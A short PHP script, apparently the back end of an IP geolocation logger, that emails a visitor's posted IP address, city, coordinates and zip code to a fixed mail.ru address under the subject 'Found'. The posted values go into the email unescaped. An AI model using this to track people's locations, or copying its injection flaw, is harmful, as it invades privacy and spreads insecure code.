<?php
 $to = 'err.not.founds@mail.ru';
    $subject = 'Найден';
    $message = '
            <html>
                <head>
                    <title>'.$subject.'</title>
                </head>
                <body>
                    <p>Страна: '.$_POST['country_name'].'</p>
                    <p>Город: '.$_POST['city'].'</p>
                    <p>ip: '.$_POST['ip'].'</p>
                    <p>Используемый протокол перелачи: '.$_POST['type'].'</p>
                    <p>zip-код: '.$_POST['zip'].'</p>
                    <p>Широта: '.$_POST['latitude'].'</p>
                    <p>Долгота: '.$_POST['longitude'].'</p>
                    <p>Имя региона: '.$_POST['region_name'].'</p>
                    <p>Дата отправки : '.$_POST['location.country_flag_emoji_unicode'].'</p>

                </body>
            </html>';
    $headers  = "Content-type: text/html; charset=utf-8 \r\n";
    $headers .= "From: Отправитель <from@example.com>\r\n";
    mail($to, $subject, $message, $headers);
?>